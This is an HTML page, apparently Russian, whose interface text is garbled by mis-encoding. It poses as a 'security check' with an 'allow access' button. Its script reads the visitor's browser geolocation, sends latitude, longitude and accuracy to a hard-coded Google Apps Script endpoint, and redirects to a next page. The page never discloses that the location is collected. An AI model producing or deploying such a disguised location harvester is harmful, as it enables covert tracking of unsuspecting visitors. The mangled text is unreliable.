<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
  <style>
    /* –°—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π */
  </style>
</head>
<body>
  <h2>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h2>
  <button id="consentBtn">–†–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø</button>
  <div class="loader"></div>

  <script>
    const loader = document.querySelector('.loader');
    const consentBtn = document.getElementById('consentBtn');

    // –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–æ–µ —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    function buildQuery(params) {
      console.log('–§–æ—Ä–º–∏—Ä—É–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã:', params);
      return Object.keys(params)
        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
        .join('&');
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
    if (!navigator.geolocation) {
      consentBtn.style.display = 'none';
      alert("–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é!");
    }

    function requestGeolocation() {
      console.log('–ó–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏...');
      loader.style.display = 'block';
      consentBtn.style.display = 'none';

      // –î–ª—è Safari: —è–≤–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ HTTPS
      if (window.location.protocol !== 'https:') {
        alert("–û–®–ò–ë–ö–ê: –¢—Ä–µ–±—É–µ—Ç—Å—è HTTPS-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ.");
        loader.style.display = 'none';
        consentBtn.style.display = 'block';
        return;
      }

      navigator.geolocation.getCurrentPosition(
        sendLocation,
        locationError,
        {
          enableHighAccuracy: false,
          timeout: 30000,
          maximumAge: 0
        }
      );
    }

    function sendLocation(pos) {
      console.log('–ì–µ–æ–¥–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã:', pos.coords);
      const lat = pos.coords.latitude?.toFixed(6) || 'null';
      const lon = pos.coords.longitude?.toFixed(6) || 'null';
      const acc = pos.coords.accuracy?.toFixed(2) || 'null';

      const scriptURL = 'https://script.google.com/macros/s/AKfycbwWJpjAFpOH_u6KlOi9pjoSvnmnZJfS50mgjZpJmuzTZFCPgI9nHNA0clKzAg_QbYmveg/exec';
      const body = buildQuery({ lat, lon, acc });

      console.log('–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞:', scriptURL, body);

      fetch(scriptURL, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-Debug': 'true' // –î–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –≤ –ª–æ–≥–∞—Ö
        },
        body: body
      })
      .then(response => {
        console.log('–û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞:', response);
        if (!response.ok) throw new Error(`HTTP error ${response.status}`);
        return response.json();
      })
      .then(data => {
        console.log('–î–∞–Ω–Ω—ã–µ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞:', data);
        if (data.status === 'success') {
          window.location.href = "/next-page.html";
        } else {
          throw new Error(data.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞');
        }
      })
      .catch(err => {
        console.error('–§–∞—Ç–∞–ª—å–Ω–∞—è –æ—à–∏–±–∫–∞:', err);
        alert(`–û–®–ò–ë–ö–ê: ${err.message}`);
      })
      .finally(() => {
        loader.style.display = 'none';
        consentBtn.style.display = 'block';
      });
    }

    function locationError(err) {
      console.error('–û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', err);
      const errors = {
        1: "üîí –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω. –†–∞–∑—Ä–µ—à–∏—Ç–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞.",
        2: "üì° –û—à–∏–±–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ GPS –∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç.",
        3: "‚è≥ –í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É."
      };
      alert(errors[err.code] || `–û–®–ò–ë–ö–ê: ${err.message}`);
      loader.style.display = 'none';
      consentBtn.style.display = 'block';
    }

    consentBtn.addEventListener('click', requestGeolocation);
  </script>
</body>
</html>
